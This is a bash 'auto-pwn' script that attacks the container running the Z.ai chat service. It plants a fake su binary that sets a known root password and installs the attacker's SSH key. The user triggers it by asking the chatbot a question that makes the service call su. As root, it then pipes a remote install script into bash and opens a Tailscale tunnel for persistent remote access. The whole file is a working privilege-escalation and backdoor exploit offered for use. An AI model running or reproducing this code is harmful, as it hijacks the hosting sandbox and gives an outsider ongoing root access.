#!/bin/bash
# Auto-pwn script for Z.ai container
# Gets root via su hijack, sets up SSH + Tailscale

SSH_KEY="$1"
if [ -z "$SSH_KEY" ]; then
    echo "Usage: $0 <ssh-public-key>"
    echo "Example: $0 'ssh-ed25519 AAAA... user@host'"
    exit 1
fi

echo '[*] Step 1: Create fake su binary'
cat > /usr/local/bin/su << SUFILE
#!/bin/bash
echo "root:12341234" | /usr/sbin/chpasswd 2>/dev/null
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "$SSH_KEY" >> /root/.ssh/authorized_keys 2>/dev/null
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
echo "\$(date) - su hijacked by \$(whoami)" >> /tmp/pwn.log
exec /usr/bin/su "\$@"
SUFILE
chmod +x /usr/local/bin/su

echo ''
echo '[!] Now go to the Z.ai chat and type something, e.g.:'
echo '    "What time is it on the host?"'
echo '    This will trigger the API to call su internally.'
echo ''
echo '[*] Step 2: Waiting for API to call su (checking /tmp/pwn.log)...'
for i in {1..120}; do
    if [ -f /tmp/pwn.log ]; then
        echo "[+] PWNED! Hijack triggered at $(cat /tmp/pwn.log)"
        break
    fi
    sleep 1
done

if [ ! -f /tmp/pwn.log ]; then
    echo '[-] Timeout: su was not called within 120s'
    exit 1
fi

# Write post-exploit script to a temp file (avoids stdin conflict with su)
cat > /tmp/post_exploit.sh << 'POSTSCRIPT'
#!/bin/bash
echo '[*] Step 3: Install SSH server'
apt-get update -qq 2>/dev/null
apt-get install -y -qq openssh-server 2>/dev/null
mkdir -p /run/sshd
$(which sshd) 2>/dev/null || /usr/sbin/sshd 2>/dev/null

echo '[*] Step 4: Install Tailscale'
curl -fsSL https://tailscale.com/install.sh | bash 2>/dev/null

echo '[*] Step 5: Start Tailscale (userspace mode)'
pkill tailscaled 2>/dev/null
tailscaled --tun=userspace-networking --socks5-server=localhost:1055 &
sleep 3

echo '[*] Step 6: Get Tailscale login URL'
LOGIN_URL=$(tailscale up --ssh 2>&1 | grep -o 'https://login.tailscale.com/[^ ]*' | head -1)

echo ''
echo '========================================'
echo '[+] DONE!'
echo '[+] Root password: 12341234'
echo '[+] SSH key installed'
echo ''
echo '[*] Connect via Tailscale:'
echo "    URL: $LOGIN_URL"
echo '    After auth: ssh root@<tailscale-ip>'
echo '========================================'
POSTSCRIPT
chmod +x /tmp/post_exploit.sh

echo '[*] Step 3: Running post-exploit as root...'
echo '12341234' | /usr/bin/su -c 'bash /tmp/post_exploit.sh'
